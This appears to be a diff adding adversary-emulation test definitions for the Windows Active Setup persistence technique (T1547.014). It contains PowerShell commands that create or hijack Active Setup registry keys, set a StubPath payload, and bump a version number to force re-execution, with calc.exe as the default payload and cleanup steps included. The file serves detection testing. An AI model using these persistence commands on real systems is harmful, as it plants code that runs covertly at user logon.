@@ -1,0 +1,61 @@
+attack_technique: T1547.014
+display_name: 'Active Setup'
+atomic_tests:
+- name: 'HKLM - Add atomic_test key to launch calc'
+  description: 'This test will create an atomic_test  key under HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components to launch calc by forcing to run active setup using "runonce.exe /AlternateShellStartup". Without the last command it will normally run during next logon. Note: that this test will only run once successfully if no cleanup command is run in between test.'
+  supported_platforms:
+  - windows
+  input_arguments:
+    payload:
+      description: what to execute
+      type: String
+      default: C:\Windows\System32\calc.exe
+  executor:
+    command: |-
+      New-Item "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components" -Name "atomic_test" -Force;
+      Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test" "(Default)" "ATR TEST" -Force;
+      Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test" "StubPath" "#{payload}" -Force ;
+      $runonce = [System.Environment]::ExpandEnvironmentVariables("%SYSTEMROOT%\system32\runonce.exe /AlternateShellStartup");
+      powershell -NoProfile -Command $runonce
+    cleanup_command: |-
+      Remove-Item "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test" -Force;
+      $runonce = [System.Environment]::ExpandEnvironmentVariables("%SYSTEMROOT%\system32\runonce.exe /AlternateShellStartup");
+      powershell -NoProfile -Command $runonce
+    name: powershell
+    elevation_required: true
+- name: 'HKLM - Add malicious StubPath value to existing Active Setup Entry'
+  description: "This test will add a StubPath entry to the Active Setup native registry key associated with 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) said key doesn't' have a StubPath value by default by adding one it will launch calc by forcing to run active setup using runonce.exe /AlternateShellStartup. Without the last command it will normally run on next user logon. Note: that this test will only run once successfully if no cleanup command is run in between test. "
+  supported_platforms:
+  - windows
+  input_arguments:
+    payload:
+      description: what to execute
+      type: String
+      default: C:\Windows\System32\calc.exe
+  executor:
+    command: |-
+      Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" "StubPath" "#{payload}" -Force ;
+      $runonce = [System.Environment]::ExpandEnvironmentVariables("%SYSTEMROOT%\system32\runonce.exe /AlternateShellStartup");
+      powershell -NoProfile -Command $runonce
+    cleanup_command: |-
+      Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "StubPath" -Force;
+      $runonce = [System.Environment]::ExpandEnvironmentVariables("%SYSTEMROOT%\system32\runonce.exe /AlternateShellStartup");
+      powershell -NoProfile -Command $runonce
+    name: powershell
+    elevation_required: true
+- name: 'HKLM - re-execute payload by increasing version number of hijacked Active Setup Key'
+  description: 'Run TestNumber 2 first - This test will increase the version number of a previously modified Active Setup key, which will force the payload to load again (otherwise it loads once first user logon per user). Cleanup for this test will also cleanup test  2 '
+  supported_platforms:
+  - windows
+  executor:
+    command: "try {if($(get-itemproperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name original_version -ErrorAction stop)) {$version = get-itempropertyvalue -Path \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -name \"Version\"; \n $p_version = Select-String \"(\\d+,\\d+,\\d+,)(\\d+)\" -inputobject $version;\n $last_v_int = $p_version.Matches.groups[2].value -as [int];\n [string]$increased_last_v = $last_v_int + 1;\n $incresed_version = $p_version.Matches.groups[1].value + $increased_last_v;\n Set-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Value \"$incresed_version\"}} catch {Set-ItemProperty  \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"original_version\" -Value \"\";\n $version = get-itempropertyvalue -Path \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -name \"Version\";\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -name \"original_version\" -Value \"$version\";\n$p_version = Select-String \"(\\d+,\\d+,\\d+,)(\\d+)\" -inputobject $version;\n $last_v_int = $p_version.Matches.groups[2].value -as [int];\n [string]$increased_last_v = $last_v_int + 1;\n $incresed_version = $p_version.Matches.groups[1].value + $increased_last_v;\n Set-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Value \"$incresed_version\"};\n$runonce = [System.Environment]::ExpandEnvironmentVariables(\"%SYSTEMROOT%\\system32\\runonce.exe /AlternateShellStartup\");\n      powershell -NoProfile -Command $runonce"
+    cleanup_command: |-
+      Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "StubPath" -Force -ErrorAction silentlycontinue;
+      $original_version = get-itempropertyvalue -Path "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -name "original_version" -ErrorAction silentlycontinue;
+      if($original_version) {
+          Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "Version" -Value "$original_version";
+          Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "original_version" -Force};
+          $runonce = [System.Environment]::ExpandEnvironmentVariables("%SYSTEMROOT%\system32\runonce.exe /AlternateShellStartup");
+          powershell -NoProfile -Command $runonce
+    name: powershell
+    elevation_required: true
